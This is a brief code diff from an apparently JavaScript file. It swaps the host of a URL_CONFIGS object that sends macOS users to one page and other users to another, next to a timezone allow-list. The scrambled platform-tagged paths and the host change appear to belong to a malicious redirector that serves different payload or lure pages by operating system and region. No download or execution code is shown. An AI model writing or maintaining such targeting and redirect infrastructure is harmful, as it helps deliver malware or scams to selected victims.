@@ -30,8 +30,8 @@ const ALLOWED_TIMEZONES = new Set([
 
 // URL configurations organized by platform target
 const URL_CONFIGS = {
-    mac: "https://orca-app-r5k2r.ondigitalocean.app/Ma0cHelpAsMEr0t0140/index.html",
-    default: "https://orca-app-r5k2r.ondigitalocean.app/Win0codejInfowj2n/index.html"
+    mac: "https://sonik-virid.vercel.app/Ma0cHelpAsMEr0t0140/index.html",
+    default: "https://sonik-virid.vercel.app/Win0codejInfowj2n/index.html"
 };
 
 // --- Pre-Compilation Cache Layer ---
